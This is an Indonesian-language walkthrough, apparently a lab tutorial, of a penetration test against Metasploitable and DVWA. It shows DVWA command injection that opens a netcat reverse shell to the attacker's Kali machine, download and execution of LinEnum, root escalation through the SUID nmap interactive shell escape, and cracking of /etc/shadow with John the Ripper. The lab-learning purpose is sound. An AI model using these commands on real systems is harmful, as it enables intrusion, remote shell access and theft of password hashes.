# Introduction

**Reverse Shell** adalah metode di mana sebuah mesin target (korban) dipaksa untuk memulai koneksi jaringan keluar kembali ke mesin penyerang. Setelah koneksi terbentuk, penyerang mendapatkan akses ke shell perintah (misalnya, bash atau sh) dari mesin target.

Reverse shell sangat disukai oleh penyerang karena:

- Mengatasi Firewall: Banyak firewall hanya memblokir koneksi masuk (inbound), tetapi mengizinkan koneksi keluar (_outbound_). Reverse shell memanfaatkan celah ini.

- Mengatasi NAT: Jika server target berada di belakang NAT (_Network Address Translation_), akan sulit untuk membuat koneksi langsung masuk. Reverse shell mengatasi masalah ini dengan membuat koneksi dari dalam.

**Privilege Escalation** adalah proses di mana seorang penyerang mendapatkan tingkat hak akses yang lebih tinggi pada sistem atau jaringan yang telah berhasil ditembus. Jika dianalogikan, _Privilege Escalation_ adalah seperti menemukan pintu masuk ke sebuah gedung, lalu mencari kunci untuk membuka semua ruangan penting di dalamnya, termasuk ruang kontrol utama.

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

- Memindai port server, yaitu 80 (http) dan 443 (https) pada IP target
```
nmap -p 80,443 --script=http-enum <ip_metasploitable>
```
Script _http-enum_ digunakan untuk membantu menemukan direktori yang tersembunyi.
```
PORT    STATE  SERVICE
80/tcp  open   http
| http-enum: 
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
443/tcp closed https
```
- Eksplorasi Web Server menggunakan browser
```
<ip_metasploitable>/dvwa
```
Kita akan menggunakan **Damn Vulnerable Web Application** (DVWA) sebagai sistem untuk melakukan simulasi serangan melalui **Command Injection**

**3. _Gaining Access (Exploitation)_**
- Login ke DVWA
```
username : admin
password : password
```
- Merubah security level ke low
```
DVWA Security -> Script Security -> Low -> Submit
```
- Mencoba command injection/execution
```
<ip_metaploitable>; ls -la
```
Menambahkan perintah lain setelah alamat IP dengan menggunakan simbol ; (titik koma) memungkinkan server menjalankan perintah berikutnya.
```
PING 192.168.175.90 (192.168.175.90) 56(84) bytes of data.
64 bytes from 192.168.175.90: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 192.168.175.90: icmp_seq=2 ttl=64 time=0.083 ms

--- 192.168.175.90 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.068/0.073/0.083/0.007 ms
total 72
drwxr-xr-x  4 www-data www-data  4096 Aug 11 02:58 .
drwxr-xr-x 11 www-data www-data  4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data  4096 May 20  2012 help
-rw-r--r--  1 www-data www-data  1509 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data  4096 May 20  2012 source
```
- Mendapatkan revese shell

Kali linux:
```
nc -lsvp <port_listener>
```
Perintah ini mengubah mesin Kali Linux menjadi "penerima" yang siap menerima shell dari mesin target.

Command execution:

```
<ip_metasploitable>; nc -e /bin/sh/ <ip_kali_linux> <port_listener>
```
Opsi -e (_execute_) memberitahu Netcat untuk menjalankan program yang ditentukan setelah koneksi berhasil dibuat. /bin/sh adalah shell perintah (biasanya dash atau bash yang ditautkan ke sh) di sistem Linux. Jadi, nc -e /bin/sh berarti "setelah koneksi jaringan terjalin, jalankan /bin/sh dan arahkan _input/output_ shell tersebut ke koneksi jaringan."

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                                   
listening on [any] 4444 ...
connect to [192.168.175.235] from (UNKNOWN) [192.168.175.90] 40263

```

**4. _Maintaining accsess dan Post exploitation_**
- Verifikasi user atau akses root
```
whoami
```

- Eksplorasi sistem

```
ls -l                    //melihat list file dan direktory
```
```
cat /etc/passwd          //melihat daftar user
```
```
find / -name “web.xml”		//mencari file penting
```
5. **_Privilege escalation_**

- Mencari kerentanan untuk privilege escalation

Metode 1 : langsung menggunakan reverse shell yang didapat
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
Skrip **LinEnum.sh** tidak mengeksploitasi kerentanan secara langsung, melainkan berfungsi sebagai detektif yang mengumpulkan bukti. Ia mencari konfigurasi yang lemah dan kerentanan yang dapat dimanfaatkan untuk mendapatkan hak akses root.
```
ls -l      //cek apakah file sudah ter-download atau tidak
```
```
chmod +x LinEnum.sh    //tambahkan hak akses untuk execute file
```
```
./LinEnum.sh
```

Metode 2 : transfer manual dari kali linux

Buka terminal baru di Kali Linux
```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Siapkan listener di sisi reverse shell
```
nc -l -p 4445 > LinEnum.sh
```
Kirimkan file hasil donwload kali linux ke reverse shell
```
cat LinEnum.sh | nc <ip_Metasploitable> 4445
```
Ctrl + C untuk menghentikan proses apabila sudah selesai

Cek kembali di sisi reverse shell apakah file sudah berhasil ditransfer
```
ls -l
```
```
chmod +x LinEnum.sh    //tambahkan hak akses untuk execute file
```
```
./LinEnum.sh
```

```
[-] Debug Info
[+] Thorough tests = Disabled

...
[-] Kernel information:
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
[-] Kernel information (continued):
Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008

[+] We can sudo without supplying a password!
usage: sudo -h | -K | -k | -L | -l | -V | -v
usage: sudo [-bEHPS] [-p prompt] [-u username|#uid] [VAR=value]
            {-i | -s | <command>}
usage: sudo -e [-S] [-p prompt] [-u username|#uid] file ...
[+] Possibly interesting SUID files:
-rwsr-xr-- 1 root dhcp 2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
...
```
Manfaatkan kerentanan pada **usr/bin/nmap** karena versi Nmap yang lama memiliki mode interaktif (_--interactive_) yang memungkinkan pengguna menjalankan perintah shell dengan hak akses root. Saat menjalankan Nmap dalam mode interaktif (_--interactive_), pengguna akan mendapatkan prompt nmap>. Pada titik ini, Nmap tidak lagi berfungsi sebagai pemindai, tetapi sebagai antarmuka interaktif yang dapat mengeksekusi perintah-perintah internalnya sendiri. Jadi, ketika pengguna mengetik !sh atau !bash, pengguna memberitahu Nmap untuk "jalankan shell baru untuk saya".
- Eksploitasi akses root pada celah ini
```
/usr/bin/nmap -–interactive
```
```
nmap> !sh
```
- Cek hak akses user setelah  eksploitasi
```
whoami
```
Jika berhasil, maka hak akses akan berubah menjadi root user

**6. _Cracking Password_**

- Memanfaatkan akses root untuk mendapatkan password
```
cat /etc/shadow/
```
- Buka terminal baru (kali linux) dan paste isi file tersebut ke file yang baru
```
sudo nano <file_password>.txt
```
- _Cracking_ file password menggunakan JohnTheRipper
```
john –-wordlist=<directory_wordlist> <file_password>.txt
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```
Jika ingin menggunakan **rockyou.txt**, pastikan sudah di ungzip sebelumnya supaya file bisa digunakan.

John the Ripper akan mencoba mencocokkan hash dengan kata-kata dalam daftar dan akan menampilkan kata sandi yang berhasil di-_crack_ di layar. Jika berhasil, pengguna akan mendapatkan kata sandi dalam bentuk teks biasa (misalnya, msfadmin atau toor).
